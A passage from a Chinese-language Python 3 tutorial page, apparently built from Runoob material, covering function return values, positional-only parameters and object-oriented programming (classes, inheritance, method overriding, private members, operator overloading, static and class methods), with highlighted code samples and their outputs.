class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs stata">#!/usr/bin/python3<br> <br># 可写函数说明<br>def <span class="hljs-built_in">sum</span>( arg1, arg2 ):<br>   # 返回2个参数的和.&quot;<br>   <span class="hljs-keyword">total</span> = arg1 + arg2<br>   <span class="hljs-keyword">print</span> (<span class="hljs-string">&quot;函数内 : &quot;</span>, <span class="hljs-keyword">total</span>)<br>   <span class="hljs-keyword">return</span> <span class="hljs-keyword">total</span><br> <br># 调用<span class="hljs-keyword">sum</span>函数<br><span class="hljs-keyword">total</span> = <span class="hljs-built_in">sum</span>( 10, 20 )<br><span class="hljs-keyword">print</span> (<span class="hljs-string">&quot;函数外 : &quot;</span>, <span class="hljs-keyword">total</span>)<br><br>输出结果：<br>函数内 :  30<br>函数外 :  30<br></code></pre></td></tr></table></figure><h3 id="强制位置参数"><a href="#强制位置参数" class="headerlink" title="强制位置参数"></a>强制位置参数</h3><p>Python3.8 新增了一个函数形参语法 &#x2F; 用来指明函数形参必须使用指定位置参数，不能使用关键字参数的形式。</p><p>在以下的例子中，形参 a 和 b 必须使用指定位置参数，c 或 d 可以是位置形参或关键字形参，而 e 和 f 要求为关键字形参:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">def f(<span class="hljs-selector-tag">a</span>, <span class="hljs-selector-tag">b</span>, /, c, d, *, e, f):<br>    <span class="hljs-built_in">print</span>(a, b, c, d, e, f)<br></code></pre></td></tr></table></figure><p>以下使用方法是正确的:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">f</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, d=<span class="hljs-number">40</span>, e=<span class="hljs-number">50</span>, f=<span class="hljs-number">60</span>)<br></code></pre></td></tr></table></figure><p>以下使用方法会发生错误:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">f</span>(<span class="hljs-number">10</span>, b=<span class="hljs-number">20</span>, c=<span class="hljs-number">30</span>, d=<span class="hljs-number">40</span>, e=<span class="hljs-number">50</span>, f=<span class="hljs-number">60</span>)   # b 不能使用关键字参数的形式<br><span class="hljs-attribute">f</span>(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>, f=<span class="hljs-number">60</span>)           # e 必须使用关键字参数的形式<br></code></pre></td></tr></table></figure><h2 id="14-面向对象"><a href="#14-面向对象" class="headerlink" title="14.面向对象"></a>14.面向对象</h2><h3 id="14-1面向对象技术简介"><a href="#14-1面向对象技术简介" class="headerlink" title="14.1面向对象技术简介"></a>14.1面向对象技术简介</h3><ul><li><strong>类(Class):</strong> 用来描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。</li><li><strong>方法：</strong>类中定义的函数。</li><li><strong>类变量：</strong>类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。</li><li><strong>数据成员：</strong>类变量或者实例变量用于处理类及其实例对象的相关的数据。</li><li><strong>方法重写：</strong>如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖（override），也称为方法的重写。</li><li><strong>局部变量：</strong>定义在方法中的变量，只作用于当前实例的类。</li><li><strong>实例变量：</strong>在类的声明中，属性是用变量来表示的，这种变量就称为实例变量，实例变量就是一个用 self 修饰的变量。</li><li><strong>继承：</strong>即一个派生类（derived class）继承基类（base class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。例如，有这样一个设计：一个Dog类型的对象派生自Animal类，这是模拟”是一个（is-a）”关系（例图，Dog是一个Animal）。</li><li><strong>实例化：</strong>创建一个类的实例，类的具体对象。</li><li><strong>对象：</strong>通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。</li></ul><p>和其它编程语言相比，Python 在尽可能不增加新的语法和语义的情况下加入了类机制。</p><p>Python中的类提供了面向对象编程的所有基本功能：类的继承机制允许多个基类，派生类可以覆盖基类中的任何方法，方法中可以调用基类中的同名方法。</p><p>对象可以包含任意数量和类型的数据。</p><h3 id="14-2类定义"><a href="#14-2类定义" class="headerlink" title="14.2类定义"></a>14.2类定义</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs erlang">class ClassName:<br>    &lt;statement-<span class="hljs-number">1</span>&gt;<br>    .<br>    .<br>    .<br>    &lt;statement-N&gt;<br></code></pre></td></tr></table></figure><p>类实例化后，可以使用其属性，实际上，创建一个类之后，可以通过类名访问其属性。</p><h3 id="14-3类对象"><a href="#14-3类对象" class="headerlink" title="14.3类对象"></a>14.3类对象</h3><p>类对象支持两种操作：属性引用和实例化。</p><p>属性引用使用和 Python 中所有的属性引用一样的标准语法：<strong>obj.name</strong>。</p><p>类对象创建后，类命名空间中所有的命名都是有效属性名。所以如果类定义是这样:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyClass</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;一个简单的类实例&quot;&quot;&quot;</span><br>    i = <span class="hljs-number">12345</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;hello world&#x27;</span><br> <br><span class="hljs-comment"># 实例化类</span><br>x = MyClass()<br> <br><span class="hljs-comment"># 访问类的属性和方法</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MyClass 类的属性 i 为：&quot;</span>, x.i)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MyClass 类的方法 f 输出为：&quot;</span>, x.f())<br><br>输出结果：<br>MyClass 类的属性 i 为： <span class="hljs-number">12345</span><br>MyClass 类的方法 f 输出为： hello world<br></code></pre></td></tr></table></figure><p>类有一个名为 <strong>init</strong>() 的特殊方法（<strong>构造方法</strong>），该方法在类实例化时会自动调用</p><p> <strong>init</strong>() 方法可以有参数，参数通过 <strong>init</strong>() 传递到类的实例化操作上。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-attribute">class</span> Complex:<br>    <span class="hljs-attribute">def</span> __init__(self, realpart, imagpart):<br>        <span class="hljs-attribute">self</span>.r = realpart<br>        <span class="hljs-attribute">self</span>.i = imagpart<br><span class="hljs-attribute">x</span> = Complex(<span class="hljs-number">3</span>.<span class="hljs-number">0</span>, -<span class="hljs-number">4</span>.<span class="hljs-number">5</span>)<br><span class="hljs-attribute">print</span>(x.r, x.i)   # 输出结果：<span class="hljs-number">3</span>.<span class="hljs-number">0</span> -<span class="hljs-number">4</span>.<span class="hljs-number">5</span><br></code></pre></td></tr></table></figure><h3 id="14-4self代表类的实例，而非类"><a href="#14-4self代表类的实例，而非类" class="headerlink" title="14.4self代表类的实例，而非类"></a>14.4self代表类的实例，而非类</h3><p>类的方法与普通的函数只有一个特别的区别——它们必须有一个额外的<strong>第一个参数名称</strong>, 按照惯例它的名称是 self。</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smali">class Test:<br>    def prt(self):<br>        print(self)<br>        print(self.__class__)<br><br>t = Test()<br>t.prt()<br><br>输出结果：<br>&lt;__main__.Test<span class="hljs-built_in"> instance </span>at 0x100771878&gt;<br>__main__.Test<br></code></pre></td></tr></table></figure><h3 id="14-5类的方法"><a href="#14-5类的方法" class="headerlink" title="14.5类的方法"></a>14.5类的方法</h3><p>在类的内部，使用 <strong>def</strong> 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 self, 且为第一个参数，self 代表的是类的实例。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-comment">#类定义</span><br><span class="hljs-keyword">class</span> <span class="hljs-symbol">people:</span><br>    <span class="hljs-comment">#定义基本属性</span><br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    age = <span class="hljs-number">0</span><br>    <span class="hljs-comment">#定义私有属性,私有属性在类外部无法直接进行访问</span><br>    __weight = <span class="hljs-number">0</span><br>    <span class="hljs-comment">#定义构造方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,n,a,w</span>):<br>        <span class="hljs-variable language_">self</span>.name = n<br>        <span class="hljs-variable language_">self</span>.age = a<br>        <span class="hljs-variable language_">self</span>.__weight = w<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>        print(<span class="hljs-string">&quot;%s 说: 我 %d 岁。&quot;</span> <span class="hljs-string">%(self.name,self.age)</span>)<br> <br><span class="hljs-comment"># 实例化类</span><br>p = people(<span class="hljs-string">&#x27;runoob&#x27;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">30</span>)<br>p.speak()<br><br>输出结果：<br>runoob 说: 我 <span class="hljs-number">10</span> 岁。<br></code></pre></td></tr></table></figure><h3 id="14-6继承"><a href="#14-6继承" class="headerlink" title="14.6继承"></a>14.6继承</h3><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs erlang">class DerivedClassName(BaseClassName):<br>    &lt;statement-<span class="hljs-number">1</span>&gt;<br>    .<br>    .<br>    .<br>    &lt;statement-N&gt;<br></code></pre></td></tr></table></figure><p>子类（派生类 DerivedClassName）会继承父类（基类 BaseClassName）的属性和方法。</p><p>BaseClassName（实例中的基类名）必须与派生类定义在一个作用域内。除了类，还可以用表达式，基类定义在另一个模块中时这一点非常有用:</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">DerivedClassName</span>(<span class="hljs-title">modname</span>.<span class="hljs-type">BaseClassName</span>):</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-comment">#类定义</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">people</span>:<br>    <span class="hljs-comment">#定义基本属性</span><br>    name = <span class="hljs-string">&#x27;&#x27;</span><br>    age = <span class="hljs-number">0</span><br>    <span class="hljs-comment">#定义私有属性,私有属性在类外部无法直接进行访问</span><br>    __weight = <span class="hljs-number">0</span><br>    <span class="hljs-comment">#定义构造方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n,a,w</span>):<br>        <span class="hljs-variable language_">self</span>.name = n<br>        <span class="hljs-variable language_">self</span>.age = a<br>        <span class="hljs-variable language_">self</span>.__weight = w<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s 说: 我 %d 岁。&quot;</span> %(<span class="hljs-variable language_">self</span>.name,<span class="hljs-variable language_">self</span>.age))<br> <br><span class="hljs-comment">#单继承示例</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">student</span>(<span class="hljs-title class_ inherited__">people</span>):<br>    grade = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,n,a,w,g</span>):<br>        <span class="hljs-comment">#调用父类的构函</span><br>        people.__init__(<span class="hljs-variable language_">self</span>,n,a,w)<br>        <span class="hljs-variable language_">self</span>.grade = g<br>    <span class="hljs-comment">#覆写父类的方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;%s 说: 我 %d 岁了，我在读 %d 年级&quot;</span>%(<span class="hljs-variable language_">self</span>.name,<span class="hljs-variable language_">self</span>.age,<span class="hljs-variable language_">self</span>.grade))<br> <br> <br>s = student(<span class="hljs-string">&#x27;ken&#x27;</span>,<span class="hljs-number">10</span>,<span class="hljs-number">60</span>,<span class="hljs-number">3</span>)<br>s.speak()<br><br>输出结果：<br>ken 说: 我 <span class="hljs-number">10</span> 岁了，我在读 <span class="hljs-number">3</span> 年级<br></code></pre></td></tr></table></figure><h3 id="14-7多继承"><a href="#14-7多继承" class="headerlink" title="14.7多继承"></a>14.7多继承</h3><p>Python同样有限的支持多继承形式。多继承的类定义形如下例:</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haskell"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-type">DerivedClassName</span>(<span class="hljs-type">Base1</span>, <span class="hljs-type">Base2</span>, <span class="hljs-type">Base3</span>):</span><br><span class="hljs-class">    &lt;statement-1&gt;</span><br><span class="hljs-class">    .</span><br><span class="hljs-class">    .</span><br><span class="hljs-class">    .</span><br><span class="hljs-class">    &lt;statement-<span class="hljs-type">N</span>&gt;</span><br></code></pre></td></tr></table></figure><p>需要注意圆括号中父类的顺序，若是父类中有相同的方法名，而在子类使用时未指定，python从左至右搜索 即方法在子类中未找到时，从左到右查找父类中是否包含方法。</p><h3 id="14-8方法重写"><a href="#14-8方法重写" class="headerlink" title="14.8方法重写"></a>14.8方法重写</h3><p>如果你的父类方法的功能不能满足你的需求，你可以在子类重写你父类的方法，实例如下：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Parent</span>:        <span class="hljs-comment"># 定义父类</span><br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">myMethod</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>      print (<span class="hljs-string">&#x27;调用父类方法&#x27;</span>)<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Child</span>(<span class="hljs-title class_">Parent</span>): <span class="hljs-comment"># 定义子类</span><br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">myMethod</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>      print (<span class="hljs-string">&#x27;调用子类方法&#x27;</span>)<br> <br>c = <span class="hljs-title class_">Child</span>()          <span class="hljs-comment"># 子类实例</span><br>c.myMethod()         <span class="hljs-comment"># 子类调用重写方法</span><br><span class="hljs-variable language_">super</span>(<span class="hljs-title class_">Child</span>,c).myMethod() <span class="hljs-comment">#用子类对象调用父类已被覆盖的方法</span><br><br>输出：<br>调用子类方法<br>调用父类方法<br></code></pre></td></tr></table></figure><p><a href="https://www.runoob.com/python/python-func-super.html">super() 函数</a>是用于调用父类(超类)的一个方法。</p><h3 id="14-9类属性与方法"><a href="#14-9类属性与方法" class="headerlink" title="14.9类属性与方法"></a>14.9类属性与方法</h3><h4 id="类的私有属性"><a href="#类的私有属性" class="headerlink" title="类的私有属性(__)"></a>类的私有属性(__)</h4><p><strong>__private_attrs</strong>：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 <strong>self.__private_attrs</strong>。</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs swift">#<span class="hljs-operator">!/</span>usr<span class="hljs-regexp">/bin/</span>python3<br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">JustCounter</span>:<br>    __secret<span class="hljs-title class_ inherited__">Count</span> = 0  # 私有变量<br>    <span class="hljs-keyword">public</span><span class="hljs-title class_ inherited__">Count</span> = 0    # 公开变量<br> <br>    def count(<span class="hljs-keyword">self</span>):<br>        <span class="hljs-keyword">self</span>.__secret<span class="hljs-title class_ inherited__">Count</span> += 1<br>        <span class="hljs-keyword">self</span>.public<span class="hljs-title class_ inherited__">Count</span> += 1<br>        print (<span class="hljs-keyword">self</span>.__secret<span class="hljs-title class_ inherited__">Count</span>)<br> <br>counter = <span class="hljs-title class_ inherited__">JustCounter</span>()<br>counter.count()<br>counter.count()<br>print (counter.public<span class="hljs-title class_ inherited__">Count</span>)<br>print (counter.__secret<span class="hljs-title class_ inherited__">Count</span>)  # 报错，实例不能访问私有变量<br><br>输出结果：<br>1<br>2<br>2<br><span class="hljs-title class_ inherited__">Traceback</span> (most recent call last):<br>  <span class="hljs-title class_ inherited__">File</span> &quot;test.py&quot;, line 16, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    print (counter.__secret<span class="hljs-title class_ inherited__">Count</span>)  # 报错，实例不能访问私有变量<br><span class="hljs-title class_ inherited__">AttributeError</span>: &#x27;<span class="hljs-title class_ inherited__">JustCounter</span>&#x27; object has no attribute &#x27;__secret<span class="hljs-title class_ inherited__">Count</span>&#x27;<br></code></pre></td></tr></table></figure><h4 id="类的方法-self"><a href="#类的方法-self" class="headerlink" title="类的方法(self)"></a>类的方法(self)</h4><p>在类的内部，使用 def 关键字来定义一个方法，与一般函数定义不同，类方法必须包含参数 <strong>self</strong>，且为第一个参数，<strong>self</strong> 代表的是类的实例。</p><p><strong>self</strong> 的名字并不是规定死的，也可以使用 <strong>this</strong>，但是最好还是按照约定使用 <strong>self</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Site</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, url</span>):<br>        <span class="hljs-variable language_">self</span>.name = name       <span class="hljs-comment"># public</span><br>        <span class="hljs-variable language_">self</span>.__url = url   <span class="hljs-comment"># private</span><br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">who</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;name  : &#x27;</span>, <span class="hljs-variable language_">self</span>.name)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;url : &#x27;</span>, <span class="hljs-variable language_">self</span>.__url)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__foo</span>(<span class="hljs-params">self</span>):          <span class="hljs-comment"># 私有方法</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;这是私有方法&#x27;</span>)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">foo</span>(<span class="hljs-params">self</span>):            <span class="hljs-comment"># 公共方法</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;这是公共方法&#x27;</span>)<br>        <span class="hljs-variable language_">self</span>.__foo()<br> <br>x = Site(<span class="hljs-string">&#x27;菜鸟教程&#x27;</span>, <span class="hljs-string">&#x27;www.runoob.com&#x27;</span>)<br>x.who()        <span class="hljs-comment"># 正常输出</span><br>x.foo()        <span class="hljs-comment"># 正常输出</span><br>x.__foo()      <span class="hljs-comment"># 报错</span><br></code></pre></td></tr></table></figure><h4 id="类的私有方法"><a href="#类的私有方法" class="headerlink" title="类的私有方法"></a>类的私有方法</h4><p><strong>__private_method</strong>：两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用。<strong>self.__private_methods</strong>。</p><p>l类的专有方法:</p><ul><li><strong><strong>init</strong> :</strong> 构造函数，在生成对象时调用</li><li><strong><strong>del</strong> :</strong> 析构函数，释放对象时使用</li><li><strong><strong>repr</strong> :</strong> 打印，转换</li><li><strong><strong>setitem</strong> :</strong> 按照索引赋值</li><li><strong><strong>getitem</strong>:</strong> 按照索引获取值</li><li><strong><strong>len</strong>:</strong> 获得长度</li><li><strong><strong>cmp</strong>:</strong> 比较运算</li><li><strong><strong>call</strong>:</strong> 函数调用</li><li><strong><strong>add</strong>:</strong> 加运算</li><li><strong><strong>sub</strong>:</strong> 减运算</li><li><strong><strong>mul</strong>:</strong> 乘运算</li><li><strong><strong>truediv</strong>:</strong> 除运算</li><li><strong><strong>mod</strong>:</strong> 求余运算</li><li><strong><strong>pow</strong>:</strong> 乘方</li></ul><h3 id="14-10运算符重载"><a href="#14-10运算符重载" class="headerlink" title="14.10运算符重载"></a>14.10运算符重载</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-comment">#!/usr/bin/python3</span><br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Vector</span>:<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, a, b</span>):<br>      <span class="hljs-variable language_">self</span>.a = a<br>      <span class="hljs-variable language_">self</span>.b = b<br> <br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">__str__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span></span>):<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Vector (%d, %d)&#x27;</span> % (<span class="hljs-variable language_">self</span>.a, <span class="hljs-variable language_">self</span>.b)<br>   <br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>,other</span>):<br>      <span class="hljs-keyword">return</span> <span class="hljs-title class_">Vector</span>(<span class="hljs-variable language_">self</span>.a + other.a, <span class="hljs-variable language_">self</span>.b + other.b)<br> <br>v1 = <span class="hljs-title class_">Vector</span>(<span class="hljs-number">2</span>,<span class="hljs-number">10</span>)<br>v2 = <span class="hljs-title class_">Vector</span>(<span class="hljs-number">5</span>,-<span class="hljs-number">2</span>)<br>print (v1 + v2)<br><br>输出结果：<br><span class="hljs-title class_">Vector</span>(<span class="hljs-number">7</span>,<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><h3 id="14-11静态方法、普通方法、类方法"><a href="#14-11静态方法、普通方法、类方法" class="headerlink" title="14.11静态方法、普通方法、类方法"></a>14.11静态方法、普通方法、类方法</h3><p><strong>静态方法</strong>: 用 @staticmethod 装饰的不带 self 参数的方法叫做静态方法，类的静态方法可以没有参数，可以直接使用类名调用。</p><p><strong>普通方法</strong>: 默认有个self参数，且只能被对象调用。</p><p><strong>类方法</strong>: 默认有个 cls 参数，可以被类和对象调用，需要加上 @classmethod 装饰器。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs css">class Classname:<br>    @staticmethod<br>    def <span class="hljs-built_in">fun</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;静态方法&#x27;</span>)<br><br>    @classmethod<br>    def <span class="hljs-built_in">a</span>(cls):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;类方法&#x27;</span>)<br><br>    # 普通方法<br>    def <span class="hljs-built_in">b</span>(self):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;普通方法&#x27;</span>)<br><br><br><br>Classname.<span class="hljs-built_in">fun</span>()<br>Classname.<span class="hljs-built_in">a</span>()<br><br>C = <span class="hljs-built_in">Classname</span>()<br>C.<span class="hljs-built_in">fun</span>()<br>C.<span class="hljs-built_in">a</span>()<br>C.<span class="hljs-built_in">b</span>()<br></code></pre></td></tr></table></figure><p><img src="https://hsmyzj-1322074094.cos.ap-beijing.myqcloud.com/202501061638348.png"></p><p>ps：<strong>Python3 类方法总结</strong></p><ul><li>普通方法：对象访问</li><li>私有方法：两个下划线开头，只能在类内部访问</li><li>静态方法：类和对象访问，不能和其他方法重名，不然会相互覆盖，后面定义的会覆盖前面的</li><li>类方法：类和对象访问，不能和其他方法重名，不然会相互覆盖，后面定义的会覆盖前面的</li><li>多继承情况下：从左到右查找方法，找到为止，不然就抛出异常</li></ul><h2 id="15-模块"><a href="#15-模块" class="headerlink" title="15.模块"></a>15.模块</h2><p>我们基本上是用 python 解释器来编程，如果你从 Python 解释器退出再进入，那么你定义的所有的方法和变量就都消失了。</p><p>为此 Python 